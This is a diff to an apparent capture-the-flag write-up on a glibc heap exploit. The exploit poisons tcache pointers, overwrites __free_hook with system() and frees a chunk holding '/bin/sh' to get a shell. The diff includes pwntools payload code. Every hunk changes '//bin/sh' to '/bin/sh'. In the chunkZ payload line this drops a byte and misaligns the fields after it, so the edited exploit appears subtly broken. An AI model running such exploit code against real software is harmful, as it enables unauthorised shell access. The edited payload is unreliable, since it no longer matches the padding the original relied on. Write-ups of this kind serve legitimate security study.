@@ -560,7 +560,7 @@ __libc_free (void *mem)
       return;
     }
 ```
-tl;dr if we can write to the `__free_hook`, we can write the address for `system()` and invoke `system("/bin/sh")` if we call `free` on a heap chunk that begins with `//bin/sh` followed by a null byte. This works because system takes a pointer to a character array, and a pointer to a libc chunk that begins with these characters is the same thing. 
+tl;dr if we can write to the `__free_hook`, we can write the address for `system()` and invoke `system("/bin/sh")` if we call `free` on a heap chunk that begins with `/bin/sh` followed by a null byte. This works because system takes a pointer to a character array, and a pointer to a libc chunk that begins with these characters is the same thing. 
 
 # What does a Ke$ha song and this exploit have in common? A good hook
 
@@ -605,7 +605,7 @@ Now that we have a leak we can take the same techniques we've already used to ov
 
 We use the first of our two songs with file descriptors of 0 to do a second heap overflow and overwrite another tcache next pointer with the address of the free hook. For this we'll use a 0x3c0 chunk with the song `"Animal/animal.txt"`. Then we can use the second song to write the address of `system` to the freehook. 
 
-Once we do that all we need is a heap chunk that starts with the memory "//bin/sh" followed by a null byte. We can go back to our first heap overflow and overflow an extra chunk of 0x20 and write "//bin/sh" to it. We're going to also need to allocate some more chunks to perform the second overflow and write. All in all, this is what the final exploit looks like: 
+Once we do that all we need is a heap chunk that starts with the memory "/bin/sh" followed by a null byte. We can go back to our first heap overflow and overflow an extra chunk of 0x20 and write "/bin/sh" to it. We're going to also need to allocate some more chunks to perform the second overflow and write. All in all, this is what the final exploit looks like: 
 
 # Exploit
 
@@ -662,7 +662,7 @@ import_song(album + "/" * (24-len(album)))
 # Allocate chunks for first overflow
 play_song("11") # A: 0x20 chunk, used for the song #44 chunk
 play_song("12") # Z: 0x20 chunk, overwritten w/ ptr to 0x404078  
-play_song("19") # B: 0x20 chunk, overwritten by //bin/sh 
+play_song("19") # B: 0x20 chunk, overwritten by /bin/sh 
 play_song("21") # C: 0x310 chunk, overwritten w/ ptr to 0x4040c8
 
 # Allocate ancillary chunks to provide buffer in the tcache
@@ -705,7 +705,7 @@ play_song("44") # Reads from STDIN
 p.sendline("-1") # Size of "lyrics", gets A from tcache
 chunkA = p64(0x00) * 2 # Fills chunk A nullbytes
 chunkB = p64(0x00) + p64(0x21) + p64(0x404078) + p64(0x00) # Overwrites chunk B tcache ptr w/ addr of song[0].fd
-chunkZ = p64(0x00) + p64(0x20) + b"//bin/sh" + p64(0x00) # Overwrites chunk Z data w/ ""//bin/sh"" and null bytes
+chunkZ = p64(0x00) + p64(0x20) + b"/bin/sh" + p64(0x00) # Overwrites chunk Z data w/ ""/bin/sh"" and null bytes
 chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) # Overwrites chunk C tcache ptr w/ addr of song[1].lyrics_ptr
 p.send(chunkA + chunkB + chunkZ + chunkC) # Sends payload
 
